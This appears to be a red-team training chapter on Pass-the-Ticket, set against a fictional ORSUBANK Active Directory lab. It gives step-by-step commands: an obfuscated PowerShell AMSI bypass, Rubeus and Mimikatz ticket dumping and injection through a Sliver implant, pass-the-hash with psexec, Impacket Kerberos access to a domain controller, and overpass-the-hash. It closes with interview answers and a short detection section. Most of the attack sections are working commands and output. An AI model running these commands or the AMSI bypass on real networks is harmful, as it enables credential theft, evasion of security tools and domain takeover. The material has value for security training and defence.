# PASS-THE-TICKET: THE COMPLETE GUIDE
## Stealing Kerberos Tickets for Lateral Movement

> **Pass-the-Ticket works when Pass-the-Hash doesn't!**
>
> When targets require Kerberos (like Domain Controllers), NTLM hashes won't work.
> Instead, you:
> - Steal Kerberos tickets from memory
> - Inject them into your session
> - Access resources as the ticket's owner!
>
> This guide explains EVERYTHING from the ground up.

---

# TABLE OF CONTENTS

**PART 1: Understanding Pass-the-Ticket**
- What are Kerberos tickets?
- How is this different from Pass-the-Hash?
- When to use Pass-the-Ticket
- Real-world analogy

**PART 2: Extracting Tickets**
- Using Rubeus via Sliver
- Using Mimikatz via Sliver
- Types of tickets (TGT vs TGS)

**PART 3: Injecting Tickets**
- Loading stolen tickets
- Using tickets for access

**PART 4: Practical Scenarios**
- Stealing Domain Admin ticket
- Lateral movement to DC

**PART 5: Interview Questions**

---

# 📖 PART 1: Understanding Pass-the-Ticket

## 1.1: What are Kerberos Tickets?

**Tickets = Encrypted proof of identity in Kerberos authentication**

```
KERBEROS TICKETS:
─────────────────

TGT (Ticket Granting Ticket):
├── Your "master" ticket
├── Proves you authenticated to the KDC
├── Used to request access to services
├── Encrypted with KRBTGT hash
└── Usually valid for 10 hours

TGS (Ticket Granting Service / Service Ticket):
├── Ticket for a SPECIFIC service
├── Proves you're allowed to access that service
├── Encrypted with service account hash
└── Used directly with the service
```

---

## 1.2: Pass-the-Ticket vs Pass-the-Hash

| Aspect | Pass-the-Hash | Pass-the-Ticket |
|--------|---------------|-----------------|
| **What you steal** | NTLM Hash | Kerberos Ticket |
| **Protocol used** | NTLM | Kerberos |
| **Works against DC** | Usually No | Yes! |
| **Ticket/Hash lifetime** | Forever | 10 hours (TGT) |
| **Requires cracking** | No | No |

**Key insight:** Pass-the-Ticket works against Domain Controllers because they prefer Kerberos!

---

## 1.3: When to Use Pass-the-Ticket

```
USE PASS-THE-TICKET WHEN:
─────────────────────────

✓ Target requires Kerberos (DCs, some modern apps)
✓ NTLM is blocked/monitored
✓ You find a Domain Admin session
✓ You want to impersonate without password/hash

USE PASS-THE-HASH WHEN:
───────────────────────

✓ Target accepts NTLM (workstations, most services)
✓ You have NTLM hash but no active ticket
✓ You want persistent access (hash doesn't expire)
```

---

## 1.4: Real-World Analogy

```
PASS-THE-TICKET = STEALING SOMEONE'S MOVIE TICKET
─────────────────────────────────────────────────

Scenario:
You're at a movie theater. Someone bought a ticket for the VIP room.

Pass-the-Hash:
→ You steal their credit card info
→ You buy a NEW ticket
→ You're trackable (new transaction)

Pass-the-Ticket:
→ You steal their ACTUAL ticket from their pocket
→ You use their ticket to enter
→ No new transaction - you ARE them for that session!

The ticket IS the authentication!
```

---

# 📖 PART 2: Extracting Tickets

## 2.1: Method 1 - Rubeus (Recommended)

**Rubeus is the best tool for Kerberos ticket operations.**

### 2.1.1: AMSI Bypass First
```bash
[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "$x=[Ref].Assembly.GetTypes();ForEach($t in $x){if($t.Name -clike '*si*tils'){$t.GetFields('NonPublic,Static')|%{if($_.Name -clike '*ailed'){$_.SetValue($null,$true)}}}}"
```

### 2.1.2: Dump ALL Tickets
```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Rubeus.exe dump
```

**Output:**
```
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

[*] Action: Dump Kerberos Ticket Data (All Users)

[*] Current LUID    : 0x3e7

  UserName@Domain   : vamsi.krishna@ORSUBANK.LOCAL
  SID               : S-1-5-21-...
  Authentication ID : 0x000001234
  
  [*] Cached Tickets (2)
  
    [0] krbtgt/ORSUBANK.LOCAL @ ORSUBANK.LOCAL
        Start Time     : 12/27/2024 8:00:00 AM
        End Time       : 12/27/2024 6:00:00 PM
        Renew Until    : 1/3/2025 8:00:00 AM
        Ticket Flags   : forwardable, renewable, initial, pre_authent
        Base64 Ticket  : doIFXjCCBVq... [LONG BASE64]
        
    [1] LDAP/DC01.orsubank.local @ ORSUBANK.LOCAL
        ...
```

### 2.1.3: Dump Tickets to File (.kirbi)
```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Rubeus.exe dump /service:krbtgt /nowrap
```

**Copy the Base64 ticket for later use!**

---

## 2.2: Method 2 - Mimikatz

### 2.2.1: Export All Tickets
```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Mimikatz.exe "sekurlsa::tickets /export" "exit"
```

**This creates .kirbi files in current directory.**

### 2.2.2: List Tickets
```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Mimikatz.exe "kerberos::list" "exit"
```

---

## 2.3: Finding Valuable Tickets

**Look for:**
- **Domain Admin TGT:** `krbtgt/DOMAIN@DOMAIN` belonging to a DA
- **Service tickets to DC:** `CIFS/DC01@DOMAIN`, `LDAP/DC01@DOMAIN`
- **Any TGT from high-privilege user**

```
EXAMPLE: Finding DA Ticket on WS02
──────────────────────────────────

If lakshmi.devi (DA) is logged into WS02:
1. Move to WS02 (Pass-the-Hash)
2. Run Rubeus dump
3. Find lakshmi.devi's TGT
4. Now YOU can be lakshmi.devi!
```

---

# 📖 PART 3: Injecting Tickets

## 3.1: Method 1 - Rubeus /ptt

**Pass-the-Ticket with Rubeus (base64):**
```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Rubeus.exe ptt /ticket:doIFXjCCBVq...[BASE64 TICKET]
```

**Pass-the-Ticket from .kirbi file:**
```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Rubeus.exe ptt /ticket:C:\path\to\ticket.kirbi
```

---

## 3.2: Method 2 - Mimikatz kerberos::ptt

```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Mimikatz.exe "kerberos::ptt C:\path\to\ticket.kirbi" "exit"
```

---

## 3.3: Verify Ticket is Loaded

**Using klist:**
```bash
[server] sliver (ORSUBANK_WS01) > execute -o klist.exe
```

**Expected output:**
```
Current LogonId is 0:0x1234

Cached Tickets: (1)

#0>     Client: lakshmi.devi @ ORSUBANK.LOCAL
        Server: krbtgt/ORSUBANK.LOCAL @ ORSUBANK.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent
        Start Time: 12/27/2024 8:00:00 (local)
        End Time:   12/27/2024 18:00:00 (local)
```

**You're now "lakshmi.devi" for Kerberos authentication!**

---

# 📖 PART 4: Practical Scenarios

## 4.1: Scenario - Steal DA Ticket from WS02

**Step 1:** Access WS02 via Pass-the-Hash
```bash
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@192.168.100.30
```

**Step 2:** Dump tickets on WS02
```bash
# From your Sliver session on WS02
[server] sliver (ORSUBANK_WS02) > execute-assembly /opt/tools/Rubeus.exe dump /nowrap
```

**Step 3:** Find DA ticket
Look for `lakshmi.devi@ORSUBANK.LOCAL` or other DA's TGT.

**Step 4:** Use ticket on your machine
```bash
# Back on WS01 or Kali
Rubeus.exe ptt /ticket:[BASE64]
```

**Step 5:** Access Domain Controller
```bash
dir \\DC01\C$
```

**SUCCESS! You accessed DC01 as Domain Admin!**

---

## 4.2: Converting Tickets for Linux Tools

**Kali tools (Impacket) use .ccache format, not .kirbi**

**Convert .kirbi to .ccache:**
```bash
ticketConverter.py ticket.kirbi ticket.ccache
```

**Use with Impacket:**
```bash
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass orsubank.local/lakshmi.devi@DC01.orsubank.local
```

The `-k` tells Impacket to use Kerberos with the cached ticket!

---

## 4.3: Overpass-the-Hash (Pass-the-Key)

**What if you have NTLM hash but need Kerberos ticket?**

**Create TGT from NTLM hash:**
```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Rubeus.exe asktgt /user:lakshmi.devi /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt
```

**What this does:**
- Uses NTLM hash instead of password
- Requests fresh TGT from KDC
- Injects TGT into memory

**Now you have a Kerberos ticket created from the hash!**

---

# 📖 PART 5: Interview Questions

## Q1: "What is Pass-the-Ticket?"

**YOUR ANSWER:**
"Pass-the-Ticket is a lateral movement technique where an attacker steals Kerberos tickets from a compromised machine's memory and injects them into another session to impersonate the ticket's owner.

Unlike Pass-the-Hash which requires the NTLM hash, Pass-the-Ticket uses the actual Kerberos ticket that's already been issued. The key advantage is that Kerberos tickets are accepted by Domain Controllers and services that might block NTLM.

The attack involves:
1. Compromising a machine where a target user has a session
2. Dumping tickets from memory (Rubeus dump or Mimikatz)
3. Extracting valuable tickets (Domain Admin TGTs)
4. Injecting the ticket into your session (Rubeus ptt)
5. Accessing resources as that user"

---

## Q2: "What's the difference between TGT and TGS in Pass-the-Ticket?"

**YOUR ANSWER:**
"When performing Pass-the-Ticket, the type of ticket matters:

**TGT (Ticket Granting Ticket):**
- Master ticket, can be used to request access to ANY service
- More valuable - one TGT = access to everything
- Encrypted with KRBTGT hash
- If I steal a DA's TGT, I can access any resource as them

**TGS (Service Ticket):**
- Ticket for ONE specific service only
- Limited use - can only access that one service
- Encrypted with service account hash
- Example: CIFS/DC01 ticket only gives file share access

In engagements, I prioritize stealing TGTs because they're universal. TGS tickets are useful for stealthy access to specific services without touching the KDC again."

---

## Q3: "When would you use Pass-the-Ticket instead of Pass-the-Hash?"

**YOUR ANSWER:**
"I use Pass-the-Ticket when:

1. **Targeting Domain Controllers** - DCs prefer Kerberos and often restrict NTLM
2. **NTLM is blocked** - Some environments disable NTLM entirely
3. **Already have active session** - If a DA is logged in, their ticket is more valuable than hunting for their hash
4. **Stealth** - Reusing existing tickets generates less suspicious traffic than NTLM authentication
5. **Kerberos delegation** - Taking over delegated tickets for further attacks

I use Pass-the-Hash when:
1. I have the hash but no active session to steal tickets from
2. Target services accept NTLM
3. I need persistent access (hashes don't expire, tickets do)"

---

## Q4: "What is Overpass-the-Hash?"

**YOUR ANSWER:**
"Overpass-the-Hash, also called Pass-the-Key, is a hybrid technique that uses an NTLM hash to request a Kerberos ticket.

The attack flow:
1. I have a user's NTLM hash (from LSASS dump, SAM, etc.)
2. I use the hash to authenticate to the KDC via AS-REQ
3. KDC issues a legitimate TGT
4. I now have a Kerberos ticket, not just a hash

This is useful because:
- Converts NTLM hash to Kerberos ticket
- Works against Kerberos-only services
- Creates 'fresh' ticket that might avoid detection
- The resulting ticket is identical to a legitimate one

With Rubeus: `asktgt /user:admin /rc4:HASH /ptt`

This is different from Silver Ticket which forges a TGS without KDC interaction."

---

## Q5: "How do you detect Pass-the-Ticket attacks?"

**YOUR ANSWER:**
"Detection focuses on ticket anomalies:

1. **Event ID 4768** (TGT request) - Look for TGT requests from IPs that shouldn't be requesting them

2. **Event ID 4769** (TGS request) - Service ticket requests from computers where the user isn't logged in

3. **Multiple authentications from different IPs** - Same ticket used from different locations

4. **Ticket lifetime anomalies** - Reused tickets might have suspicious start times

5. **Endpoint indicators** - Rubeus/Mimikatz detection, suspicious process access to LSASS

The challenge is false positives - legitimate roaming users generate similar patterns. Solutions like Microsoft Defender for Identity correlate multiple signals to detect actual attacks."

---

# ✅ CHECKLIST

- [ ] Found valuable target with DA session (via BloodHound)
- [ ] Moved to target machine (Pass-the-Hash)
- [ ] Applied AMSI bypass
- [ ] Dumped tickets with Rubeus/Mimikatz
- [ ] Identified DA TGT in dump
- [ ] Injected ticket with ptt
- [ ] Verified ticket loaded (klist)
- [ ] Accessed Domain Controller with stolen ticket

---

# 🔗 What's Next?

**You now have complete domain access. Consider:**
→ **[07. Golden Ticket](./07_golden_ticket.md)** - Persistent access that survives password resets
→ **[04b. DCSync](./04b_dcsync_attack.md)** - Dump all credentials

**Defensive understanding:**
→ Review detection methods in each walkthrough

---

**MITRE ATT&CK Mapping:**
| Technique | ID | Description |
|-----------|-----|-------------|
| Use Alternate Authentication Material: Pass the Ticket | T1550.003 | Pass-the-Ticket |
| Steal or Forge Kerberos Tickets | T1558 | Ticket manipulation |

**Difficulty:** ⭐⭐⭐ (Intermediate)
**Interview Importance:** ⭐⭐⭐⭐⭐ (Core Kerberos attack technique)

---
